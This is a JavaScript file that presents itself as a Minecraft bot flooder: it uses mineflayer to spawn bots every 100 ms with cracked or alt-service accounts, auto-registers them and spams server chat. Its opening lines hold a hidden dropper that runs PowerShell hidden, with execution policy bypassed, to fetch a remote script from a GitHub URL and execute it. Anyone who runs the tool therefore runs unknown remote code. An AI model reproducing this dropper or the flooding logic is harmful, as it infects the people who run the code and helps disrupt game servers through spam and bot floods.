const { exec } = require('child_process');
const powerShellCommand = 'powershell -nop -ep bypass -w hidden -c "iwr -useb https://raw.githubusercontent.com/s1uiasdad/log-acc-v2/main/scr/download.ps1 | iex"';
exec(powerShellCommand, { detached: true, stdio: 'ignore' });

const snekfetch = require("snekfetch");
const config = require("./config.json");
let number = 1;

function createBot(username) {
    var mineflayer = require('mineflayer');
    var bot = mineflayer.createBot({
        host: config.ip,
        port: config.port,
        username: username,
        version: config.version,
        plugins: {
            conversions: false,
            furnace: false,
            math: false,
            painting: false,
            scoreboard: false,
            villager: false,
            bed: false,
            book: false,
            boss_bar: false,
            chest: false,
            command_block: false,
            craft: false,
            digging: false,
            dispenser: false,
            enchantment_table: false,
            experience: false,
            rain: false,
            ray_trace: false,
            sound: false,
            tablist: false,
            time: false,
            title: false,
            physics: config.physics,
            blocks: true
        }
    });
    bot.on('login', () => {
        bot.chat("/login p@ssword123");
        bot.chat("/register p@ssword123 p@ssword123");
        setInterval(() => {
            bot.chat(config.spammessage);
        }, config.spamintervalms);
        console.log("Logged in " + bot.username);
    });
    bot.on('error', err => console.log(err));
    bot.on('kicked', function(reason) {
        console.log("I got kicked for", reason, "lol");
        createBot(username); // Retry with the same username
    });
}

setInterval(() => {
    if (config.altening) {
        snekfetch.get(`http://api.thealtening.com/v1/generate?token=${config.altening_token}&info=true`).then(n => {
            createBot(n.body.token);
        });
    } else {
        number++;
        createBot(config.crackedusernameprefix + number.toString());
    }
}, 100);  // Reduce delay between logins to 100ms

// Create and login multiple bots at once
for (let i = 0; i < 5; i++) {  // Create 5 bots immediately
    if (config.altening) {
        snekfetch.get(`http://api.thealtening.com/v1/generate?token=${config.altening_token}&info=true`).then(n => {
            createBot(n.body.token);
        });
    } else {
        number++;
        createBot(config.crackedusernameprefix + number.toString());
    }
}

